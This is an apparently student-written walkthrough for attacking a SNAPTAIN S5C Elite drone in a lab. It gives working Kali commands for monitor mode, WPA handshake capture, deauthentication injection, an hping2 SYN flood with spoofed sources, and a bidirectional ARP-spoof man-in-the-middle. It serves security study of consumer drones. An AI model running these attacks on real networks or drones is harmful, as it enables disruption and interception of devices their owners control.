# **MVP SNAPTAIN Drone Walkthrough**



### GENERAL INFO

A lot of this information was found from a study that another group did on a RYZE TELLO Drone.

https://www.diva-portal.org/smash/record.jsf?pid=diva2%3A1586253\&dswid=8978



For our set up however we are using the SNAPTAIN S5C Elite, which is similar, but certain port numbers and setups have to be adjusted.



Hardware needed includes: SNAPTAIN S5C Elite Drone, ALFA AWUS036ACM network adapter, kali environment, and a laptop.



For this walkthrough I'll include pictures from both the RYZE TELLO hack as well as my own.



### **KALI SETUP:**



I used a USB with a bootable kali instance on it. I made this using roofus and two USBs, one to run the kali install on the other one. This set up allows me to hot swap between windows and Linux on boot, so I don't have to have a dedicated laptop for this.



### **RECONNAISSANCE:**



### NMAP

Since this is a walkthrough to understand how to perform one of these attacks were gonna cheat a little to identify the UDP and TCP ports that the drone communicates on.



To do this we will run nmap while connected to the drones wifi.



\*\*Problems here, I cant keep the drone powered on long enough to perform the scan. Will come back to this.



#### MONITOR MODE

"RFMON(Radio FrequencyMONitor)isoneofeightmodesthat802.11wirelesscardscan

operate in. It allows a computer with a wireless network interface to monitor all traffic

received on a wireless channel without having to associate with an access point (AP) or

ad hoc network first."



Monitor mode is a setting for a wireless card that allows you to view all WiFI based traffic around you, and is essential for getting the necessary data on the Drones network. 



In order to run monitor mode you will want a wireless adapter that you can plug into your laptop. I used the **ALFA AWUS036ACM**. This allows me to do more then what my normal NIC could do. The nice thing about this adapter is that the drivers come built in so you don't have to go through dependency hell to get it set up, it just works.



\-- New terminal window-

\# ifconfig

This command is used to find the interface of the wireless network adapter called wlan0

\# airmon-ng check kill

This command stops all current processes which are using the WiFi interface

\# airmon-ng start wlan0

This command starts the wlan0 in monitor mode

\# airodump-ng wlan0mon

This command displays all WiFi networks in range and provides the target network’s

BSSID



You will need to change wlan0 to the wlan that you are using with your adapter. In my case that is wlan1.

You will also probably need to add sudo to alot of these commands.

to stop monitor mode for any reason simply:



\# airmon-ng stop wlan0mon

stop monitor mode

\#systemctl restart NetworkManager

reset your network manager so you can connect to the internet



\# airodump-ng-c Y--bssid XX:XX:XX:XX:XX:XX-w /home wlan0mon

shows clients connected to the target network specified with the BSSID and Channel. The wflag is the directory where we want to save

the capture file. The capture file will include the WPA handshake.



#### DEAUTH



\-- New terminal window-

\# aireplay-ng-0 10-a XX:XX:XX:XX:XX:XX wlan0mon

This command disconnects the client by injecting 10 deauthentication packets in the target,

which can be seen in figure 5. When the client disconnects from the network it tries to

reconnect by sending a WPA handshake, this is then captured and saved for later use



**This will be useful in case we want to attack encryption, we will look more into this.**



### **DRONE HACKING:**

#### 

#### DDOS

hping2: Sends custom TCP, UDP, ICMP, and raw IP packets with control over nearly every header field



\#sudo hping2 -c 1500 -d 120 -S -w 64 -p 8866 --flood --rand-source 172.19.10.1

\-c 1500 — send 1500 packets

\-d 120 — pad each packet to 120 bytes

\-S — set the SYN flag (initiate TCP handshake)

\-w 64 — set TCP window size to 64

\-p 8866 — target port 8866

\--flood — send packets as fast as possible, not waiting for replies and suppressing reply info — this is what turns a test into a flood

\--rand-source — spoof a random source IP on every packet, so replies go nowhere and the real origin is hidden



\*\*this works just fine, but we should identify the actual port that TCP is on



#### MITM (ARP SPOOF)



\# sysctl-w net.ipv4.ip\_forward=1

The first step is to turn on packet forwarding, this enables the attacker to act as a router on

the network by allowing packets to be forwarded through it to the right address.



\# arpspoof-i wlan1 -t 172.19.10.100 172.19.10.1

This command enables the monitoring of packets on the interface wlan0, from the

controller (192.168.10.2) to the drone (192.168.10.1). This command tells the controller

that if it wants to send any packages to the drone it should be sent to the attacker’s MAC

address instead, which will then be forwarded to the drone.



\-- New terminal window-

\# arpspoof-i wlan1 -t 172.19.10.1 172.19.10.100

While letting the previous ARP spoof keep running in the other terminal the reverse

command is run in a new terminal, which tells the drone that if it wants to send any

packages to the controller it should be sent to the attacker’s MAC address instead



replace the .100 with the ip of the phone, you can check by looking at your wifi settings



\*\*note, we should look into how to find the phones ip addr without using it, im sure it's simple.



